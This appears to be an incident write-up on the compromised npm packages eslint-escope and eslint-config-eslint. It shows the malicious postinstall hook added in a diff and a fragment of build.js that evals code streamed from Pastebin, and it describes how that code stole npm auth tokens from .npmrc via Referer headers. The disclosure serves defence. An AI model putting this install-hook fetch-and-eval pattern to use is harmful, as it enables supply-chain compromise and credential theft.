The attacker modified `package.json` in both `eslint-escope@3.7.2` and `eslint-config-eslint@5.0.2`, adding a `postinstall` script to run `build.js`.

```diff
{
+ "postinstall": "node ./lib/build.js",
}
```

#### `build.js`

This script downloads another script from Pastebin and `eval`s its contents.

Some people have reported that this code has an issue:

```js
r.on("data", c => {
  eval(c);
});
```

Because it doesn't wait for the request to complete, it is possible for the reqeuest to only send part of the script and the `eval` call to fail with a `SyntaxError`, which is how the issue was discovered.

#### pastebin (https://pastebin.com/XLeVP82h, taken down)

The script extracts the `_authToken` from a user's `.npmrc` and sends it to `histats` and `statcounter` inside the `Referer` header.